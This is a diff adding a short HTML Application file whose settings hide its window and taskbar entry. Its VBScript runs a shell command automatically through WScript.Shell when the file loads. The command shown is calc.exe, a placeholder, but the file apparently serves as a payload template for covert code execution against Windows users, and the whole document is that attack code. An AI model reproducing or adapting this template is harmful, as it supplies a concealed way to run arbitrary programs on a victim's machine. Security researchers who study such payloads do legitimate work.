@@ -1,0 +1,10 @@
+<html><head>
+<hta:application caption="no" windowState="minimize" showInTaskBar="no" scroll="no" navigable="no" />
+<script language="VBScript"> 
+    Sub foo
+    	command = "calc.exe"
+        Set objShell = CreateObject("Wscript.Shell")
+        objShell.Run command
+    End Sub
+foo()
+</script></head><body></body></html>
